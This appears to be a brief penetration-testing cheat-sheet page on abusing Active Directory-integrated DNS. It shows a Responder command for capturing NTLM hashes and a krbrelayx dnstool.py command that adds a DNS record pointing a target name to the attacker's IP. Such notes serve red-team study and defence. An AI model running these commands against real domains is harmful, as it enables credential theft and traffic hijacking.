---
title: "Krbrelayx"
date: 2024-7-23
tags: ["Dns Spoofing", "Krbrelayx", "Dnstools", "Active Driectory", "Windows", "DNS", "Ntlm"]
---

### Abuse #1: Add Active Directory Integrated DNS records via LDAP

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Capture NTLM hash
sudo responder -I tun0
```

```console
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <TARGET_RECORD> --data <LOCAL_IP> <TARGET_IP>
```

<small>*Ref: [krbrelayx tools](https://github.com/dirkjanm/krbrelayx)*</small>

{{< /tabcontent >}}
